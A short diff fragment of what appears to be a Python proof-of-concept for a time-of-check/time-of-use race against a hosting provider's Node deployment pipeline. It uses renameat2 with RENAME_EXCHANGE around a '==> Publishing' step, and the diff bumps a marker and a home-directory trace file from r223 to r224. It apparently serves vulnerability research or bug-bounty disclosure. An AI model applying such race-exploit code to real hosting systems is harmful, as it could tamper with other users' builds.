@@ -13,7 +13,7 @@ import time
 SYS_RENAMEAT2 = 316
 AT_FDCWD = -100
 RENAME_EXCHANGE = 2
-MARKER = b"HOSTINGER_NODE_FILE_LOG_WATCH_TOCTOU_GATE:r223"
+MARKER = b"HOSTINGER_NODE_SSH_LOG_WATCH_TOCTOU_GATE:r224"
 PUBLISHING = b"==> Publishing"
 libc = ctypes.CDLL(None, use_errno=True)
 dist = os.fsencode("dist")
@@ -108,7 +108,7 @@ except OSError:
 
 trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
 try:
-    trace_path = Path.home() / ".h1-r223-race-trace.json"
+    trace_path = Path.home() / ".h1-r224-race-trace.json"
     trace_path.write_text(json.dumps(trace, sort_keys=True))
     trace_path.chmod(0o600)
 except OSError:
